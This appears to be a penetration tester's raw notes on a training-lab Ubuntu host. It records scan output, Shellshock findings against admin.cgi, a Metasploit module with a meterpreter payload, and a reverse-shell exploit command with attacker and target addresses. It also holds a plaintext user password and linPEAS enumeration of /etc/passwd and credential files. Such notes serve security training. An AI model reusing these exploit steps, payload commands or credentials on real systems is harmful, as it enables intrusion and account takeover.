# ip
10.11.1.71

# nmap scan
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne

## OS 
Operating System is Ubuntu Linux 14.04 (kernel: 3.13.0-141-generic)
CPU: AMD EPYC 7371 16-Core Processor

## SSH 
SSH server version: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2 ( service.version=6.6.1p1 openssh.comment=Ubuntu-2ubuntu2 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:6.6.1p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=14.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:14.04 service.protocol=ssh fingerprint_db=ssh.banner )

## Server
Server: Apache/2.4.7 (Ubuntu)
5ff4869a472df9a9cc35aefde724fd88

## Programming language
X-Powered-By: PHP/5.5.9-1ubuntu4.4

## CMS 
* BigTree CMS => Version: ### 4.0.6 Release
* Github: https://github.com/bigtreecms/BigTree-CMS
* CSS: Gridlock - A CSS responsive grid system [12 column standard], @author Ben Plum, @version 0.1.9
* jQuery v1.7.1 jquery.com
* Tiny MCE

## Database 
MySql

## Pages

Summary:
* file list: http://10.11.1.71/cgi-bin/test.cgi
* /cgi-bin/admin.cgi 
* http://10.11.1.71/phpmyadmin/
* http://10.11.1.71/custom/
* /cgi-bin/ (Status: 403) => path traversal?
* /phpmyadmin (Status: 301)

/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/core (Status: 301)
/custom (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
/site (Status: 301)
/templates (Status: 301)
+ OSVDB-3092: /cgi-bin/admin.cgi: This might be interesting.                                                                                                                                              
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...    

# findings
Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.                                                                                                        
+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).                                                                   
+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278)  
* https://www.exploit-db.com/exploits/34879                                                                                                                                    

* Priviledge escalsation

https://www.exploit-db.com/exploits/37292


# Evidence
* Use module: multi/http/apache_mod_cgi_bash_env_exec
* with payload ``set payload linux/x86/meterpreter/bind_tcp``
* session created
* Works better with ``sudo python Documents/34900.py payload=reverse rhost=10.11.1.71 lhost=192.168.119.174 lport=4443``
* user: gibson pw: zaq1xsw2cde3 => discovered with automated enumaration (linPEAS)



?? /usr/bin/passwd

Files: 
/var/lib/pam/password
/usr/bin/passwd
/usr/share/doc/passwd
/usr/share/doc/libnet-ssleay-perl/examples/passwd-cb.pl
/usr/share/lintian/overrides/passwd
/usr/share/man/sv/man5/passwd.5.gz
/usr/share/man/sv/man1/passwd.1.gz
/usr/share/man/zh_TW/man5/passwd.5.gz
/usr/share/man/hu/man5/passwd.5.gz
/usr/share/man/hu/man1/passwd.1.gz
/usr/share/man/fr/man5/passwd.5.gz
/usr/share/man/fr/man1/passwd.1.gz
/usr/share/man/man5/passwd.5.gz
/usr/share/man/ru/man5/passwd.5.gz
/usr/share/man/ru/man1/passwd.1.gz
/usr/share/man/man3/passwd2des.3.gz
/usr/share/man/zh_CN/man5/passwd.5.gz
/usr/share/man/it/man5/passwd.5.gz
/usr/share/man/it/man1/passwd.1.gz
/usr/share/man/cs/man5/passwd.5.gz
/usr/share/vim/vim74/ftplugin/passwd.vim
/usr/share/vim/vim74/syntax/passwd.vim
/usr/share/bash-completion/completions/passwd
/usr/lib/pppd/2.4.5/passprompt.so
/usr/lib/pppd/2.4.5/passwordfd.so
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod

try: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS


# priviledge escalation
## passwd file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
gibson:x:1000:1000:gibson,,,:/home/gibson:/bin/bash
ossec:x:1001:1001::/var/ossec-hids2.8:/bin/false
ossecm:x:1002:1001::/var/ossec-hids2.8:/bin/false
ossecr:x:1003:1001::/var/ossec-hids2.8:/bin/false

## usr
www-data @ alpha (uid=33, gid=33, euid=33, egid=33)

## supported shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


[+] CPU info
Architecture:          x86_64                                                                                                                                                                                
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
NUMA node(s):          1
Vendor ID:             AuthenticAMD
CPU family:            23
Model:                 1
Stepping:              2
CPU MHz:               3094.187
BogoMIPS:              6188.37
Hypervisor vendor:     VMware
Virtualization type:   full
L1d cache:             32K
L1i cache:             64K
L2 cache:              512K
L3 cache:              65536K
NUMA node0 CPU(s):     0

Is ASLR enabled? ............... Yes 

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                                                                  
UUID=03d81a8b-f8e9-4022-a3d3-bd8e7d749ea4 /               ext4    errors=remount-ro 0       1                                                                                                                
UUID=7e16a276-37a4-4b16-957c-9d354aee1b13 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0


[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                                    
-rwxr-xr-x 1 root root  1017016 Apr 23  2014 /bin/bash                                                                                                                                                       
lrwxrwxrwx 1 root root        4 Oct  9  2014 /bin/sh -> dash
-
10.11.1.71> 
rwxr-xr-x 1 root root   252056 Jun 20  2014 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   239896 Jun 20  2014 /lib/systemd/systemd-udevd
-rwxr-xr-x 2 root root    32112 Jun  3  2014 /sbin/getty
-rwxr-xr-x 1 root root   265848 Jul 18  2014 /sbin/init
-r-xr-xr-x 4 root root   789208 Jan 17  2018 /usr/lib/vmware-caf/pme/bin/ManagementAgentHost
lrwxrwxrwx 1 root root       37 Jan 17  2018 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin64/appLoader
-rwxr-xr-x 1 root root   637496 Apr  3  2014 /usr/sbin/apache2
-rwxr-xr-x 1 root root 11742080 Jul 16  2014 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   766784 May 12  2014 /usr/sbin/sshd
lrwxrwxrwx 1 root root       37 Jan 17  2018 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin64/vmtoolsd


+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                                                              
gdm-password Not Found                                                                                                                                                                                       
gnome-keyring-daemon Not Found                                                                                                                                                                               
lightdm Not Found                                                                                                                                                                                            
vsftpd Not Found                                                                                                                                                                                             
apache2 process found (dump creds from memory as root)                                                                                                                                                       
sshd Not Found

PGP Keys: /usr/bin/gpg  

[+] Last logons
gibson   pts/0        Fri Jan  1 11:08:29 2021 - Fri Jan  1 11:28:45 2021  (00:20)     192.168.119.166                                                                                                       
gibson   pts/0        Fri Jan  1 11:01:50 2021 - Fri Jan  1 11:06:57 2021  (00:05)     192.168.119.166

wtmp begins Fri Jan  1 11:01:50 2021

[+] Last time logon each user
Username         Port     From             Latest                                                                                                                                                            
root             tty1                      Tue Nov 26 12:01:40 -0500 2019
gibson           pts/0    192.168.119.166  Fri Jan  1 11:08:29 -0500 2021

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                                                                        
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

From '/etc/mysql/my.cnf' Mysql user: user               = mysql  

UsePAM yes
  --> Some certificates were found (out limited):
/etc/vmware-tools/GuestProxyData/server/cert.pem
UsePAM yes
  --> Some certificates were found (out limited):
/etc/vmware-tools/GuestProxyData/server/cert.pem

Keyring folder: /usr/share/keyrings                                                                                                                                                                          
/usr/share/keyrings:
total 20
-rw-r--r-- 1 root root 12335 May 18  2012 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root     0 May 18  2012 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root  1227 May 18  2012 ubuntu-master-keyring.gpg
Keyring folder: /var/lib/apt/keyrings
/var/lib/apt/keyrings:
total 16
-rw-r--r-- 1 root root 12335 Jul 22  2014 ubuntu-archive-keyring.gpg


# [+] Searching uncommon passwd files (splunk)
passwd file: /etc/cron.daily/passwd                                                                                                                                                                          
passwd file: /etc/pam.d/passwd
passwd file: /usr/bin/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

# Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 60 Oct  9  2014 /var/lib/phpmyadmin/blowfish_secret.inc.php                                                                                                                       
-rw-r----- 1 root www-data 0 Oct  9  2014 /var/lib/phpmyadmin/config.inc.php
-rw-r----- 1 root www-data 8 Oct  9  2014 /etc/phpmyadmin/htpasswd.setup
-rw-r----- 1 root www-data 549 Oct  9  2014 /etc/phpmyadmin/config-db.php


# pws
[+] Searching passwords in config PHP files
/var/www/html/core/config.example.php                                                                                                                                                                        
/var/www/html/templates/config.php
/usr/share/doc/phpmyadmin/examples/config.manyhosts.inc.php
/usr/share/phpmyadmin/libraries/config.default.php


/etc/acpi/powerbtn.sh:                userhome=`getent passwd $user | cut -d: -f6`                                                                                                                           
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
/etc/debconf.conf:#BindPasswd: secret
/etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password = password
/etc/iscsi/iscsid.conf:#discovery.sendtargets.auth.password_in = password_in
/etc/iscsi/iscsid.conf:#node.session.auth.password = password
/etc/iscsi/iscsid.conf:#node.session.auth.password_in = password_in
/etc/nsswitch.conf:passwd:         compat
/etc/pam.d/common-password:password     [success=1 defaul


/var/www/html/core/inc/bigtree


[+] Finding possible password in config files
 /etc/dbus-1/system.conf                                                                                                                                                                                     
credentials-based authentication -->
 /etc/adduser.conf
passwd
 /etc/apache2/apache2.conf
passwd files from being
 /etc/apache2/conf-available/phpmyadmin.conf
passwd.setup
 /etc/apache2/conf-enabled/phpmyadmin.conf
passwd.setup
 /etc/nsswitch.conf
passwd:         compat
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,
 /etc/phpmyadmin/apache.conf
passwd.setup
 /etc/phpmyadmin/lighttpd.conf
passwd"
passwd.userfile = "/etc/phpmyadmin/htpasswd.setup"
 /etc/init/passwd.conf
passwd - clear locks on passwd a
10.11.1.71> 
nd related files
passwd to avoid million duplicate bug reports
passwd locks"
passwd.lock /etc/group.lock
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret

